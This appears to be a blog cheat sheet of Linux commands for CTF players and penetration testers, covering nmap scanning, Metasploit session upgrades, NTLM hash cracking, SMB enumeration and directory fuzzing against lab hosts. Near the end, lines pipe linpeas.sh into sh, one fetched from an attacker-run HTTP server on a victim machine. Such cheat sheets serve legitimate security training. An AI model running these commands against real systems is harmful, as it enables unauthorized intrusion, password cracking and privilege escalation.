---
title: Linux Commands for Hacking and Security
publishDate: 2023-08-08
author: Abhinav Kumar
image:   '~/assets/images/bash.jpeg'
excerpt: Linux commands and shortcuts very often used by Hackers, Security professionals, CTF Players.
draft: false
category: Hacking 101
---

Linux commands that are often used by hackers, security professional and CTF players. We will avoid any payloads or oneliner exploits ( will cover in different page sometime).
Updated - October 02, 2023.

### Add Target to hosts file

```bash
┌──(abhinav㉿ETHICALHACKX)-[~]
└─$ echo '10.10.196.20 blue.thm' | sudo tee -a /etc/hosts
[sudo] password for abhinav: 
10.10.196.20 blue.thm
```

### Nmap

```bash
#for TCP Scan
sudo nmap -sC -sV -p- -T5 -Pn targethost

#for UDP Scan
sudo nmap -sU -sV -p- -T5 -Pn targethost

# Store scan results for ports separated by comma.
┌──(abhinav㉿ETHICALHACKX)-[~]
└─$ ports=$(nmap -p- --min-rate=1000 -T4 cronos.htb | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed 's/,$//')

# Check which ports are found
┌──(abhinav㉿ETHICALHACKX)-[~]
└─$ echo $ports
22,53,80,9227,19041,30100

# Pass the information in -p argument as $ports
┌──(abhinav㉿ETHICALHACKX)-[~]
└─$ sudo nmap -sC -sV -A -O -T5 -p$ports cronos.htb
```



## Metasploit

Start Metasploit with database
```bash
# Pass the information in -p argument as $ports
┌──(abhinav㉿ETHICALHACKX)-[~]
└─$ systemctl start postgresql

┌──(abhinav㉿ETHICALHACKX)-[~]
└─$ msfdb init
Creating database user 'msf'
Enter password for new role:
Enter it again:
Creating databases 'msf' and 'msf_test'
Creating configuration file in /usr/share/metasploit-framework/config/database.yml
Creating initial database schema
```

### Metasploit Shell Upgrade to Meterpreter

```bash
sessions -u 3
sessions -u -1
use post/multi/manage/shell_to_meterpreter
run session=-1
```

Cracking hash with John

```bash
┌──(abhinav㉿ETHICALHACKX)-[~]
└─$ john hash --format=NT --wordlist=/usr/share/wordlists/rockyou.txt 
```

### Cracking hash with hashcat

Windows NTLM Hash
```bash
hashcat -m 1000 -a 0 hash /usr/share/wordlists/rockyou.txt.gz
```




## Extract Files

Gz Files

```bash
gunzip archive.gz
```

tar Files
```bash
tar –xvzf archive.tar.gz
```

## SSH Connection 

```bash
ssh username@host -oHostKeyAlgorithms=+ssh-dss
```


## Text Filter

```bash
grep -i #]- inlcude
grep -v #]- exclude
```
## SMB Enumeration

nmap

```bash
nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse target_HOST
```

```bash
smbclient //IP/directory
```

Mount NFS Share

make directory locally and mount it
```bash
mkdir /mnt/sampleDIR
sudo mount IP:/folder /mnt/sampleDIR
```
## netcat

get version via banner
```bash
nc IP port
```
## Linpeas

# From github
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

### Python Simple HTTP Server


```bash
python3 -m http.server 7777
curl 10.10.10.10/linpeas.sh | sh #Victim
```

### Wordpress CMS Vulnerabilty Scanning

```bash
wpscan --url https://brainfuck.htb --disable-tls-checks
```

## Directory Enumeration

```bash
┌──(abhinav㉿ETHICALHACKX)-[~]
└─$ ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://cronos.htb/FUZZ -mc 200,403 -c -t 400

                                                   
┌──(abhinav㉿ETHICALHACKX)-[~]
└─$ gobuster dir -u  http://cronos.htb/ --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --threads 200 --quiet

```

## Reading a File

```bash
cat
head
head -20 filepathandname
tail filename
tail -20 filename
cat filename | grep "word_to_filter"
more
less

```

## Replace in File

```bash
sed /s/wordtoreplace/wordtoreplacewith/g /filepath > outputfilepath
```